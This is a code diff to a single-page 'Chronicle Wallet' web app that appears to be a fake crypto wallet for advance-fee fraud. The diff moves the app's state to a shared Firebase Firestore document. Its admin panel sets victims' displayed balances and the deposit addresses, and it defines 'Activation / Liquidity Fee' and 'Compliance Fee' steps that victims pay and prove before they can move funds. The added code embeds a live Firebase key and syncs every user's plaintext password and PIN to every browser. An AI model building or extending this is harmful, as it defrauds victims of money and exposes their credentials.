@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chronicle Wallet - Web3 Vault</title>
+    <!-- Firebase SDK (Compat Version for standalone browser support) -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
         :root {
             --bg-dark: #07090e;
@@ -148,7 +151,7 @@
                 <div class="balance-card">
                     <div style="color:var(--text-muted); font-size:0.875rem;">Total Portfolio Value</div>
                     <h1 style="font-size:2.8rem; color:#fff; margin:0.25rem 0;" id="user-total-val">$0.00</h1>
-                    <p style="color:var(--accent-green); font-size:0.875rem;">▲ Portfolio Synced</p>
+                    <p style="color:var(--accent-green); font-size:0.875rem;">▲ Firebase Realtime Synced</p>
 
                     <div class="action-row-side">
                         <button class="btn" onclick="openSendModal()">↗ Send</button>
@@ -513,37 +516,80 @@
     </div>
 
     <script>
-        // Master Seed Users Pool so dropdown never shows "No Options"
+        // --- YOUR FIREBASE CONFIGURATION ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyB0gvtPHOL5RMcGOzUStFh5_83AQsXi8DY",
+            authDomain: "chronic-wallet.firebaseapp.com",
+            projectId: "chronic-wallet",
+            storageBucket: "chronic-wallet.firebasestorage.app",
+            messagingSenderId: "736762304960",
+            appId: "1:736762304960:web:3a96106682f9e4db3bd025",
+            measurementId: "G-KHJZNPCJJB"
+        };
+
+        // Initialize Firebase & Firestore
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Default Data Structures
         const defaultMasterUsers = [
             { email: "demo@chronicle.io", password: "password123", pin: "1234", btc: 1.25, eth: 14.20, usd: 48250.00, txs: [], stepIdx: 0, activeTxId: null }
         ];
 
-        let usersList = JSON.parse(localStorage.getItem('chronicle_users')) || defaultMasterUsers;
-        if (!usersList.some(u => u.email === "demo@chronicle.io")) {
-            usersList.unshift(defaultMasterUsers[0]);
-        }
-
+        let usersList = defaultMasterUsers;
         let currentUserEmail = localStorage.getItem('chronicle_current_user') || null;
-        let userEmails = JSON.parse(localStorage.getItem('chronicle_emails')) || {};
-        let exchanges = JSON.parse(localStorage.getItem('chronicle_ex')) || [{ id: 1, name: "MoonPay", logo: "MP", link: "https://buy.moonpay.com" }];
-        let actionSteps = JSON.parse(localStorage.getItem('chronicle_steps')) || [
+        let userEmails = {};
+        let exchanges = [{ id: 1, name: "MoonPay", logo: "MP", link: "https://buy.moonpay.com" }];
+        let actionSteps = [
             { id: 1, title: "Activation / Liquidity Fee", amount: 150 },
             { id: 2, title: "Clarification & Compliance Fee", amount: 250 }
         ];
-        let globalAddresses = JSON.parse(localStorage.getItem('chronicle_global_addrs')) || {
+        let globalAddresses = {
             btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
             btcQr: "",
             eth: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
             ethQr: "",
             usd: "CHRONICLE-GLOBAL-USD-TAG"
         };
-        let proofQueue = JSON.parse(localStorage.getItem('chronicle_proof_queue')) || [];
-
+        let proofQueue = [];
         let currentTheme = localStorage.getItem('chronicle_theme') || 'dark';
+
         if (currentTheme === 'light') document.getElementById('app-body').classList.add('light-mode');
 
         let liveBtcUsd = 65000;
         let liveEthUsd = 3500;
+
+        // --- REALTIME FIREBASE LISTENERS ---
+        db.collection("config").doc("appData").onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.usersList) usersList = data.usersList;
+                if (data.userEmails) userEmails = data.userEmails;
+                if (data.exchanges) exchanges = data.exchanges;
+                if (data.actionSteps) actionSteps = data.actionSteps;
+                if (data.globalAddresses) globalAddresses = data.globalAddresses;
+                if (data.proofQueue) proofQueue = data.proofQueue;
+                updateBalanceUI();
+                if (!document.getElementById('admin-tab').classList.contains('hidden')) {
+                    renderAdminDashboard();
+                }
+            } else {
+                saveState(); // Initialize Cloud Firestore document
+            }
+        });
+
+        function saveState() {
+            db.collection("config").doc("appData").set({
+                usersList: usersList,
+                userEmails: userEmails,
+                exchanges: exchanges,
+                actionSteps: actionSteps,
+                globalAddresses: globalAddresses,
+                proofQueue: proofQueue
+            }, { merge: true });
+            localStorage.setItem('chronicle_current_user', currentUserEmail);
+            localStorage.setItem('chronicle_theme', currentTheme);
+        }
 
         function showNotification(title, message, icon = "🔔") {
             const toast = document.getElementById('notification-toast');
@@ -559,24 +605,6 @@
             let u = usersList.find(x => x.email === currentUserEmail);
             return u || null;
         }
-
-        function saveState() {
-            localStorage.setItem('chronicle_users', JSON.stringify(usersList));
-            localStorage.setItem('chronicle_current_user', currentUserEmail);
-            localStorage.setItem('chronicle_emails', JSON.stringify(userEmails));
-            localStorage.setItem('chronicle_ex', JSON.stringify(exchanges));
-            localStorage.setItem('chronicle_steps', JSON.stringify(actionSteps));
-            localStorage.setItem('chronicle_global_addrs', JSON.stringify(globalAddresses));
-            localStorage.setItem('chronicle_proof_queue', JSON.stringify(proofQueue));
-            localStorage.setItem('chronicle_theme', currentTheme);
-        }
-
-        window.addEventListener('storage', (e) => {
-            usersList = JSON.parse(localStorage.getItem('chronicle_users')) || usersList;
-            globalAddresses = JSON.parse(localStorage.getItem('chronicle_global_addrs')) || globalAddresses;
-            proofQueue = JSON.parse(localStorage.getItem('chronicle_proof_queue')) || proofQueue;
-            updateBalanceUI();
-        });
 
         function sendSimulatedEmail(email, subject, body) {
             if (!userEmails[email]) userEmails[email] = [];
@@ -815,7 +843,6 @@
                 closeActionModal();
                 showNotification("Submitted", "Proof uploaded for admin review", "🖼️");
                 alert("Proof submitted successfully!");
-                renderAdminDashboard();
             };
             reader.readAsDataURL(file.files[0]);
         }
@@ -884,9 +911,9 @@
         function addExchange(e) {
             e.preventDefault();
             exchanges.push({ id: Date.now(), name: document.getElementById('ex-name').value, logo: document.getElementById('ex-logo').value, link: document.getElementById('ex-link').value });
-            saveState(); renderAdminDashboard(); alert("Exchange added!");
+            saveState(); alert("Exchange added!");
         }
-        function deleteExchange(id) { exchanges = exchanges.filter(x => x.id != id); saveState(); renderAdminDashboard(); }
+        function deleteExchange(id) { exchanges = exchanges.filter(x => x.id != id); saveState(); }
 
         function saveActionStep(e) {
             e.preventDefault();
@@ -895,9 +922,9 @@
             actionSteps.push({ id: Date.now(), title, amount });
             document.getElementById('action-title').value = '';
             document.getElementById('action-amount').value = '';
-            saveState(); renderAdminDashboard(); alert("Action step saved!");
+            saveState(); alert("Action step saved!");
         }
-        function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); renderAdminDashboard(); }
+        function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
@@ -922,13 +949,12 @@
                 }
             }
             saveState();
-            renderAdminDashboard();
         }
 
         function renderAdminDashboard() {
-            document.getElementById('admin-btc-addr').value = globalAddresses.btc;
-            document.getElementById('admin-eth-addr').value = globalAddresses.eth;
-            document.getElementById('admin-usd-addr').value = globalAddresses.usd;
+            document.getElementById('admin-btc-addr').value = globalAddresses.btc || '';
+            document.getElementById('admin-eth-addr').value = globalAddresses.eth || '';
+            document.getElementById('admin-usd-addr').value = globalAddresses.usd || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (BTC: ${u.btc.toFixed(2)} | USD: $${u.usd})</option>`).join('');
             document.getElementById('admin-users-list').innerHTML = usersList.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.email}</strong> - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
             document.getElementById('admin-exchanges-list').innerHTML = exchanges.map(ex => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px; display:flex; justify-content:space-between;"><span>${ex.name}</span> <button class="btn btn-danger" style="width:auto; padding:0.2rem 0.4rem; font-size:0.7rem;" onclick="deleteExchange(${ex.id})">Delete</button></div>`).join('');
@@ -971,7 +997,7 @@
             } else { openAuthModal('signin'); }
         }
         function closeProfileModal() { document.getElementById('profile-modal').style.display = 'none'; }
-        function handleLogOut() { currentUserEmail = null; saveState(); closeProfileModal(); updateBalanceUI(); showNotification("Logged Out", "Logged out successfully.", "👋"); }
+        function handleLogOut() { currentUserEmail = null; localStorage.removeItem('chronicle_current_user'); closeProfileModal(); updateBalanceUI(); showNotification("Logged Out", "Logged out successfully.", "👋"); }
 
         function openAuthModal(mode = 'signin') { switchAuthMode(mode); document.getElementById('auth-modal').style.display = 'flex'; }
         function closeAuthModal() { document.getElementById('auth-modal').style.display = 'none'; }
@@ -1005,7 +1031,7 @@
             if (!u) { alert("Invalid login credentials."); return; }
 
             currentUserEmail = email;
-            saveState();
+            localStorage.setItem('chronicle_current_user', currentUserEmail);
             closeAuthModal();
             updateBalanceUI();
             if (!u.pin) document.getElementById('pin-setup-modal').style.display = 'flex';
